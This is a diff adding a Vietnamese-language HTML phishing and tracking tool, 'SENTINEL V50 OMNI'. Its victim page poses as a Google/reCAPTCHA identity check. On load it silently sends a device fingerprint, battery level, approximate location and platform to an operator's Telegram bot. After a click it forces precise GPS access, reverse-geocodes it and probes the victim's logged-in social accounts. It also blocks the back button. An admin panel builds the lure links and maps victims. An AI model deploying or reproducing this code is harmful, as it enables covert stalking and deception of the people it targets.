@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+    <title id="dyn-title">Đang xác thực bảo mật...</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <style>
+        .admin-bg { background: #010409; color: #c9d1d9; font-family: ui-sans-serif, system-ui; }
+        .glass { background: #0d1117; border: 1px solid #30363d; border-radius: 1rem; }
+        .victim-body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285F4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #map { height: 350px; border-radius: 1rem; border: 1px solid #30363d; }
+    </style>
+</head>
+<body class="victim-body" id="main-body">
+
+    <div id="ui-target" class="p-4 w-full max-w-sm text-center">
+        <div class="bg-white p-10 rounded-[40px] shadow-2xl border-b-[8px] border-blue-600">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="h-6 mx-auto mb-10 opacity-70">
+            <div id="status-icon" class="loader mx-auto mb-6"></div>
+            <h3 class="text-xl font-black text-gray-800 mb-2 italic">Identity Verification</h3>
+            <p class="text-[11px] text-gray-400 mb-10 px-6 leading-relaxed uppercase font-bold tracking-tighter">Hệ thống đang kiểm tra dấu vân tay thiết bị để bảo mật tài liệu...</p>
+            <button onclick="startAbsoluteCapture()" class="flex items-center justify-between p-6 bg-gray-50 border-2 border-gray-100 rounded-3xl w-full hover:border-blue-500 active:scale-95 transition-all shadow-sm">
+                <span class="text-sm font-black text-gray-700 uppercase">Tiếp tục xác thực</span>
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="w-6">
+            </button>
+        </div>
+    </div>
+
+    <div id="ui-admin" class="hidden w-full max-w-7xl p-6 admin-bg min-h-screen">
+        <header class="flex justify-between items-center mb-8 border-b border-gray-800 pb-5">
+            <div>
+                <h1 class="text-2xl font-black italic tracking-tighter uppercase">SENTINEL <span class="text-blue-500 underline">V50 OMNI</span></h1>
+                <p class="text-[9px] text-gray-500 uppercase tracking-widest font-bold">Hệ thống giám sát thấu thị toàn phần</p>
+            </div>
+            <div class="flex gap-4">
+                <button onclick="logout()" class="text-[10px] bg-red-900/20 text-red-500 px-4 py-2 rounded-xl font-black border border-red-900/30">LOGOUT</button>
+            </div>
+        </header>
+
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+            <div class="lg:col-span-4 space-y-6">
+                <div class="glass p-6 space-y-4 shadow-2xl border-t-4 border-blue-600">
+                    <h3 class="text-blue-400 text-[10px] font-black uppercase tracking-widest italic border-b border-gray-800 pb-2">Cấu hình & Tạo Link</h3>
+                    <input id="cfg-token" type="password" placeholder="Bot Token" class="w-full bg-[#010409] border border-gray-800 p-3 rounded-xl outline-none text-xs text-white">
+                    <input id="cfg-id" type="text" placeholder="Chat ID" class="w-full bg-[#010409] border border-gray-800 p-3 rounded-xl outline-none text-xs text-white">
+                    <input id="cfg-redir" type="text" placeholder="Link đích cuối" class="w-full bg-[#010409] border border-gray-800 p-3 rounded-xl outline-none text-xs text-white">
+                    <button onclick="saveAndBuild()" class="w-full bg-blue-600 p-3 rounded-xl font-black uppercase text-[10px] shadow-lg">Build Omni-Link</button>
+                    <div id="final-link" class="p-3 bg-black rounded border border-blue-900/30 text-[9px] text-blue-400 break-all font-mono hidden cursor-pointer" onclick="copyText()"></div>
+                </div>
+                <div class="glass p-6 shadow-2xl">
+                    <h3 class="text-yellow-500 text-[10px] font-black uppercase italic mb-3">Vị trí mục tiêu cuối</h3>
+                    <div id="map"></div>
+                </div>
+            </div>
+
+            <div class="lg:col-span-8">
+                <div class="glass p-6 min-h-[600px] border-l-4 border-green-600">
+                    <div class="flex justify-between items-center mb-6 border-b border-gray-800 pb-2">
+                        <h3 class="text-green-500 text-[10px] font-black uppercase tracking-widest italic">Live Intelligence Operational Logs</h3>
+                        <span class="text-[9px] text-gray-600 uppercase font-bold animate-pulse">Auto-polling active</span>
+                    </div>
+                    <div id="log-container" class="space-y-4 font-mono text-[11px] overflow-y-auto max-h-[600px]">
+                        <div class="text-gray-700 italic">Đang chờ tín hiệu từ thực địa...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <canvas id="fp-canvas" style="display:none"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        let config = { t: '', i: '', r: 'https://google.com' };
+        let lastUpdateId = 0;
+        let map, marker, originalTitle = document.title;
+
+        // --- 1. QUẢN TRỊ (ADMIN) ---
+        if (urlParams.has('admin')) {
+            document.getElementById('main-body').className = "admin-bg";
+            document.getElementById('ui-target').classList.add('hidden');
+            if (localStorage.getItem('v50_auth') === 'true' || prompt("Access Code:") === "123") {
+                localStorage.setItem('v50_auth', 'true');
+                document.getElementById('ui-admin').classList.remove('hidden');
+                initAdmin();
+            } else { window.location.search = ""; }
+        }
+
+        function initAdmin() {
+            const saved = JSON.parse(localStorage.getItem('v50_cfg') || '{}');
+            if(saved.t) {
+                document.getElementById('cfg-token').value = saved.t;
+                document.getElementById('cfg-id').value = saved.i;
+                document.getElementById('cfg-redir').value = saved.r;
+                config = saved;
+                startMonitoring();
+            }
+            map = L.map('map').setView([10.762622, 106.660172], 13);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        }
+
+        function saveAndBuild() {
+            config = {
+                t: document.getElementById('cfg-token').value,
+                i: document.getElementById('cfg-id').value,
+                r: document.getElementById('cfg-redir').value
+            };
+            localStorage.setItem('v50_cfg', JSON.stringify(config));
+            const base = window.location.href.split('?')[0];
+            const v = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
+            const out = document.getElementById('final-link');
+            out.innerText = `${base}?v=${v}`;
+            out.classList.remove('hidden');
+            alert("Omni-Link đã sẵn sàng!");
+        }
+
+        async function startMonitoring() {
+            setInterval(async () => {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${config.t}/getUpdates?offset=${lastUpdateId + 1}`).then(r => r.json());
+                    if (res.ok && res.result.length > 0) {
+                        res.result.forEach(update => {
+                            lastUpdateId = update.update_id;
+                            if (update.message && update.message.text) {
+                                addLog(update.message.text);
+                                parseGPS(update.message.text);
+                            }
+                        });
+                    }
+                } catch(e) {}
+            }, 3000);
+        }
+
+        function addLog(text) {
+            const container = document.getElementById('log-container');
+            const time = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.className = "p-3 border-l-2 border-green-500 bg-green-500/5 mb-3 rounded-r-lg";
+            logEntry.innerHTML = `<span class="text-green-500 font-bold">[${time}]</span><br>${text.replace(/\n/g, '<br>')}`;
+            container.prepend(logEntry);
+        }
+
+        function parseGPS(text) {
+            const match = text.match(/Tọa độ: ([-.\d]+),([-.\d]+)/);
+            if (match && map) {
+                const lat = parseFloat(match[1]), lon = parseFloat(match[2]);
+                if (marker) map.removeLayer(marker);
+                marker = L.marker([lat, lon]).addTo(map);
+                map.flyTo([lat, lon], 17);
+            }
+        }
+
+        // --- 2. THEO DÕI (TRACKER) ---
+        function getFP() {
+            const canvas = document.getElementById('fp-canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.font = "14pt Arial";
+            ctx.fillText("SENTINEL-v50", 2, 2);
+            const b64 = canvas.toDataURL();
+            let hash = 0;
+            for (let i = 0; i < b64.length; i++) { hash = ((hash << 5) - hash) + b64.charCodeAt(i); hash |= 0; }
+            return "ID-" + Math.abs(hash);
+        }
+
+        async function checkSocial() {
+            const nets = [{n:'Facebook', u:'https://www.facebook.com/favicon.ico'}, {n:'Gmail', u:'https://accounts.google.com/ServiceLogin?service=mail'}];
+            let found = [];
+            const promises = nets.map(net => new Promise(resolve => {
+                const img = new Image();
+                img.onload = () => { found.push(net.n); resolve(); };
+                img.onerror = () => resolve();
+                img.src = net.u + "?" + Math.random();
+                setTimeout(resolve, 2000);
+            }));
+            await Promise.all(promises);
+            return found.length > 0 ? found.join(", ") : "None";
+        }
+
+        async function startAbsoluteCapture() {
+            document.getElementById('status-icon').className = "loader mx-auto mb-6";
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    const lat = p.coords.latitude, lon = p.coords.longitude;
+                    let addr = "N/A";
+                    try {
+                        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
+                        addr = geo.display_name;
+                    } catch(e) {}
+                    const social = await checkSocial();
+                    await sendTele(`🎯 <b>GPS SUCCESS</b>\n🆔 ID: <code>${getFP()}</code>\n🕵️ Social: ${social}\n📍 Tọa độ: ${lat},${lon}\n🏠 Địa chỉ: ${addr}`);
+                    window.location.replace(config.r);
+                }, () => {
+                    alert("Lỗi xác thực! Bạn phải cho phép vị trí để tiếp tục truy cập.");
+                    startAbsoluteCapture();
+                }, { enableHighAccuracy: true });
+            }
+        }
+
+        async function initTracker() {
+            try {
+                const v = urlParams.get('v');
+                if(v) config = JSON.parse(decodeURIComponent(escape(atob(v))));
+            } catch(e) {}
+            
+            // Auto-Cloaking
+            document.addEventListener('visibilitychange', () => {
+                document.title = document.hidden ? "🔴 CẢNH BÁO BẢO MẬT!" : originalTitle;
+            });
+
+            // Chặn quay lại
+            history.pushState(null, null, location.href);
+            window.onpopstate = () => { history.go(1); alert("Xác thực ngay!"); };
+
+            // Thu thập ngầm (OneTrust + FP)
+            try {
+                const res = await fetch('https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location', { headers: { 'Accept': 'application/json' } }).then(r => r.json());
+                const bat = await navigator.getBattery();
+                const batInfo = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Sạc' : 'Pin'})`;
+                await sendTele(`🚀 <b>ENTRY DETECTED</b>\n🆔 ID: <code>${getFP()}</code>\n🔋 Pin: ${batInfo}\n🌐 Vùng: ${res.city}, ${res.country}\n📱 TB: ${navigator.platform}`);
+            } catch(e) {}
+        }
+
+        async function sendTele(msg) {
+            if (!config.t) return;
+            return fetch(`https://api.telegram.org/bot${config.t}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: config.i, text: msg, parse_mode: 'HTML' })
+            });
+        }
+
+        function copyText() { navigator.clipboard.writeText(document.getElementById('final-link').innerText); alert("Đã Copy Link!"); }
+        function logout() { localStorage.removeItem('v50_auth'); location.href = location.pathname; }
+
+        if (!urlParams.has('admin')) window.onload = initTracker;
+    </script>
+</body>
+</html>
